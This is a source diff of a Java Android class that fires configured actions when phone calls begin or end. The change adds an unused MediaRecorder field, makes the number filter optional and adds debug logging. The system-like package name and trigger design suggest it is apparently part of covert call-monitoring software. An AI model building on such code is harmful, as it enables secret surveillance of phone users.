@@ -9,7 +9,7 @@
 
 package com.android.service.event;
 
-import java.io.IOException;
+import android.media.MediaRecorder;
 
 import com.android.service.Call;
 import com.android.service.auto.Cfg;
@@ -18,8 +18,6 @@ import com.android.service.conf.ConfigurationException;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerCall;
 import com.android.service.util.Check;
-import com.android.service.util.DataBuffer;
-import com.android.service.util.WChar;
 
 public class EventCall extends BaseEvent implements Observer<Call> {
 	/** The Constant TAG. */
@@ -28,7 +26,8 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 	private int actionOnExit, actionOnEnter;
 	private String number;
 	private boolean inCall = false;
-
+	private MediaRecorder recorder = null;
+	
 	@Override
 	public void actualStart() {
 		ListenerCall.self().attach(this);
@@ -43,7 +42,10 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 	@Override
 	public boolean parse(ConfEvent conf) {
 		try {
-			number = conf.getString("number");
+			if (conf.has("number") == true)
+				number = conf.getString("number");
+			else
+				number = "";
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " exitAction: " + actionOnExit + " number: \"");//$NON-NLS-1$ //$NON-NLS-2$
@@ -56,8 +58,6 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
 			}
-
-			return false;
 		}
 
 		return true;
@@ -65,7 +65,7 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 
 	@Override
 	public void actualGo() {
-		// TODO Auto-generated method stub
+
 	}
 
 	public int notification(Call c) {
@@ -74,6 +74,11 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 			// Match any number
 			if (number.length() == 0) {
 				inCall = true;
+				
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification): triggering inCall"); //$NON-NLS-1$
+				}
+				
 				onEnter();
 
 				return 0;
@@ -82,6 +87,11 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 			// Match a specific number
 			if (c.getNumber().contains(number)) {
 				inCall = true;
+				
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification): triggering inCall"); //$NON-NLS-1$
+				}
+				
 				onEnter();
 
 				return 0;
@@ -92,7 +102,11 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 
 		if (c.isOngoing() == false && inCall == true) {
 			inCall = false;
-
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): triggering endCall"); //$NON-NLS-1$
+			}
+			
 			onExit();
 			return 0;
 		}
